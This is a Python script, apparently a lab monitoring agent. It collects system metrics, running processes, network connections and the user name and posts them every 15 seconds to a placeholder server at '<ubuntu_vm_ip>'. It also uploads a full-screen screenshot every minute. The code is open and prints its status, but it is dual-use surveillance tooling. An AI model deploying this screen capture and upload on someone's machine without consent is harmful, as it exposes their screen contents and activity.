import psutil
import requests
import json
from datetime import datetime
import time
from PIL import ImageGrab

def get_memory_info():
    virtual_memory = psutil.virtual_memory()
    swap_memory = psutil.swap_memory()
    return {
        "memory": [virtual_memory.total, virtual_memory.available, virtual_memory.percent,
                   virtual_memory.used, virtual_memory.free],
        "swap": [swap_memory.total, swap_memory.used, swap_memory.free, swap_memory.percent,
                 swap_memory.sin, swap_memory.sout]
    }

def get_boot_time():
    boot_time_timestamp = psutil.boot_time()
    boot_time = datetime.fromtimestamp(boot_time_timestamp)
    return boot_time.strftime("%Y-%m-%d %H:%M:%S")

def get_cpu_info():
    cpu_times = psutil.cpu_times_percent(interval=1)
    cpu_info = {
        "cpu_percent": psutil.cpu_percent(interval=1),
        "cpu": [cpu_times.user, cpu_times.system, cpu_times.idle]
    }
    
    if hasattr(cpu_times, 'nice'):
        cpu_info["cpu"].append(cpu_times.nice)
    if hasattr(cpu_times, 'iowait'):
        cpu_info["cpu"].append(cpu_times.iowait)
    
    return cpu_info

def get_network_info():
    net_io_counters = psutil.net_io_counters(pernic=True)
    network_info = {}
    for nic, addrs in psutil.net_if_addrs().items():
        if nic in net_io_counters:
            network_info[nic] = [
                net_io_counters[nic].bytes_sent, net_io_counters[nic].bytes_recv,
                net_io_counters[nic].packets_sent, net_io_counters[nic].packets_recv,
                net_io_counters[nic].errin, net_io_counters[nic].errout,
                net_io_counters[nic].dropin, net_io_counters[nic].dropout
            ]
    return network_info

def get_processes_info():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append({"name": proc.info['name'], "pid": proc.info['pid']})
    return processes

def get_network_connections():
    net_conns = []
    for conn in psutil.net_connections(kind='inet'):
        net_conns.append([conn.fd, conn.family, conn.type,
                          [conn.laddr.ip, conn.laddr.port],
                          [conn.raddr.ip, conn.raddr.port] if conn.raddr else [],
                          conn.status, conn.pid])
    return net_conns

def get_disk_io_counters():
    disk_io = psutil.disk_io_counters(perdisk=True)
    disk_io_counters = {disk: [io.read_count, io.write_count, io.read_bytes, io.write_bytes,
                               io.read_time, io.write_time]
                        for disk, io in disk_io.items()}
    return disk_io_counters

def capture_screenshot():
    # Capture the screenshot
    im = ImageGrab.grab()
    # Get the current datetime for the filename
    dt = datetime.now()
    fname = "pic_{}.{}.png".format(dt.strftime("%Y%m%d_%H%M_%S"), dt.microsecond // 100000)
    # Save the screenshot
    im.save(fname, 'png')
    print(f"Screenshot saved to {fname}")
    return fname

def send_screenshot(server_url, filepath):
    with open(filepath, 'rb') as f:
        files = {'file': f}
        response = requests.post(server_url, files=files)
        if response.status_code == 200:
            print("Screenshot sent successfully!")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")

def collect_data():
    data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f"),
        "memory": get_memory_info()["memory"],
        "swap": get_memory_info()["swap"],
        "boot_dt": get_boot_time(),
        "cpu_percent": get_cpu_info()["cpu_percent"],
        "cpu": get_cpu_info()["cpu"],
        "network": get_network_info(),
        "processes_info": get_processes_info(),
        "network_conns": get_network_connections(),
        "disk_io_counters": get_disk_io_counters(),
        "machine": psutil.users()[0].name if psutil.users() else "Unknown",
        "dt": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    }
    return data

if __name__ == "__main__":
    server_url_data = "http://<ubuntu_vm_ip>:5000/receive_data"
    server_url_screenshot = "http://<ubuntu_vm_ip>:5000/receive_screenshot"
    
    # Capture and send a screenshot right away
    screenshot_path = capture_screenshot()
    send_screenshot(server_url_screenshot, screenshot_path)
    
    last_screenshot_time = time.time()
    
    while True:
        # Collect and send system data
        data = collect_data()
        timestamp = datetime.now().strftime("%m-%d-%Y-%H-%M-%S")
        data['timestamp'] = timestamp
        headers = {'Content-Type': 'application/json'}
        response = requests.post(server_url_data, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully!")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")

        # Check if it's time to take and send a screenshot
        current_time = time.time()
        if current_time - last_screenshot_time >= 60:
            screenshot_path = capture_screenshot()
            send_screenshot(server_url_screenshot, screenshot_path)
            last_screenshot_time = current_time
        
        time.sleep(15)  # Send data every 15 seconds
